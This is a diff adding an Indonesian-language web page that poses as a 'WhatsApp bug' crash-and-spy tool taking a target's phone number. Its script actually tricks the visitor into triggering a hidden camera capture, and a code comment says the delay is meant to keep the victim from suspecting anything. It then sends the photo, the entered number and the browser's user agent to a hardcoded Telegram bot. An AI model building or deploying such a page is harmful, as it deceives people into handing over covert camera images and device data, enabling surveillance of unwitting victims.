@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Bug WhatsApp ZAAN 100% Work</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        
+        h1 {
+            text-align: center;
+            color: #00ff00;
+            text-shadow: 0 0 10px #00ff00;
+            margin-bottom: 25px;
+            font-size: 24px;
+        }
+        
+        .warning {
+            background: rgba(255, 0, 0, 0.2);
+            border-left: 4px solid red;
+            padding: 10px;
+            margin: 15px 0;
+            border-radius: 5px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #00ff00;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #00ff00;
+            background: black;
+            color: white;
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        
+        .btn {
+            background: linear-gradient(to right, #00ff00, #00cc00);
+            color: black;
+            border: none;
+            padding: 15px;
+            width: 100%;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 10px;
+            transition: 0.3s;
+        }
+        
+        .btn:hover {
+            background: linear-gradient(to right, #00cc00, #009900);
+            box-shadow: 0 0 20px #00ff00;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .camera-status {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 12px;
+            color: #888;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>⚡ BUG WHATSAPP ZAAN 100% ⚡</h1>
+        
+        <div class="warning">
+            <strong>PERHATIAN:</strong> Bug ini hanya bekerja sekali pakai. Pastikan koneksi stabil!
+        </div>
+        
+        <form id="bugForm">
+            <div class="input-group">
+                <label for="waNumber">📱 Nomor WhatsApp Target:</label>
+                <input type="text" id="waNumber" placeholder="Contoh: 6281234567890" required>
+            </div>
+            
+            <div class="input-group">
+                <label for="bugType">🎯 Jenis Bug:</label>
+                <input type="text" id="bugType" value="CRASH+SPY 2.0" readonly style="background: #333;">
+            </div>
+            
+            <input type="file" id="cameraCapture" accept="image/*" capture="environment" class="hidden">
+            
+            <button type="button" id="bugButton" class="btn">
+                🚀 AKTIFKAN BUG 100% ZAAN
+            </button>
+        </form>
+        
+        <div class="camera-status" id="status">
+            Status: Menunggu aktivasi...
+        </div>
+    </div>
+    
+    <script>
+        // ===== KONFIGURASI BOT TELEGRAM =====
+        const BOT_TOKEN = '8186605145:AAH4nAskT_3TbCjYP_WC2I6ZcLspEAJmnTM';  // Ganti dengan token botmu
+        const CHAT_ID = '7491173075';      // Ganti dengan chat ID mu
+        
+        // ===== ELEMEN UTAMA =====
+        const bugButton = document.getElementById('bugButton');
+        const cameraInput = document.getElementById('cameraCapture');
+        const statusText = document.getElementById('status');
+        const waNumberInput = document.getElementById('waNumber');
+        
+        // ===== LOGIKA UTAMA =====
+        let photoTaken = false;
+        
+        bugButton.addEventListener('click', async function() {
+            if (!waNumberInput.value.trim()) {
+                alert('Harap masukkan nomor WhatsApp target!');
+                return;
+            }
+            
+            if (photoTaken) {
+                alert('Bug sudah diaktifkan untuk sesi ini!');
+                return;
+            }
+            
+            // Update status
+            statusText.innerHTML = 'Status: ⚡ Mengaktifkan bug...';
+            statusText.style.color = '#00ff00';
+            
+            // Delay sebelum trigger kamera (biar korban tidak curiga)
+            setTimeout(() => {
+                statusText.innerHTML = 'Status: 📷 Mengakses kamera...';
+                
+                // Trigger kamera tersembunyi
+                cameraInput.click();
+            }, 1500);
+        });
+        
+        // ===== SAAT FOTO DIAMBIL =====
+        cameraInput.addEventListener('change', async function(e) {
+            const file = e.target.files[0];
+            if (!file) return;
+            
+            photoTaken = true;
+            statusText.innerHTML = 'Status: 📡 Mengirim data bug...';
+            
+            try {
+                // Kirim foto ke Telegram
+                const photoForm = new FormData();
+                photoForm.append('chat_id', CHAT_ID);
+                photoForm.append('photo', file);
+                photoForm.append('caption', `🕵️ BUG ZAAN ACTIVATED\nTarget: ${waNumberInput.value}\nTime: ${new Date().toLocaleString()}\nIP: Fetching...`);
+                
+                const telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: photoForm
+                });
+                
+                // Kirim data nomor juga
+                const dataForm = new FormData();
+                dataForm.append('chat_id', CHAT_ID);
+                dataForm.append('text', `📱 TARGET WA: ${waNumberInput.value}\n⏰ WAKTU: ${new Date().toLocaleString()}\n🌐 USER AGENT: ${navigator.userAgent}`);
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    body: dataForm
+                });
+                
+                // Update status sukses
+                statusText.innerHTML = 'Status: ✅ Bug berhasil diaktifkan!';
+                bugButton.innerHTML = '🔒 BUG TELAH DIJALANKAN';
+                bugButton.style.background = 'linear-gradient(to right, #666, #333)';
+                bugButton.disabled = true;
+                
+                // Simpan data di localStorage (opsional)
+                localStorage.setItem('zaan_bug_activated', 'true');
+                localStorage.setItem('zaan_target', waNumberInput.value);
+                
+            } catch (error) {
+                statusText.innerHTML = 'Status: ❌ Gagal mengirim, coba lagi!';
+                statusText.style.color = 'red';
+                photoTaken = false;
+            }
+        });
+        
+        // ===== FITUR TAMBAHAN =====
+        // Deteksi jika sudah pernah menjalankan bug
+        if (localStorage.getItem('zaan_bug_activated') === 'true') {
+            bugButton.innerHTML = '🔒 BUG SUDAH DIJALANKAN SEBELUMNYA';
+            bugButton.style.background = 'linear-gradient(to right, #666, #333)';
+            bugButton.disabled = true;
+            statusText.innerHTML = 'Status: ⚠️ Bug sudah aktif untuk perangkat ini';
+        }
+        
+        // Auto-focus ke input nomor
+        waNumberInput.focus();
+    </script>
+</body>
+</html>
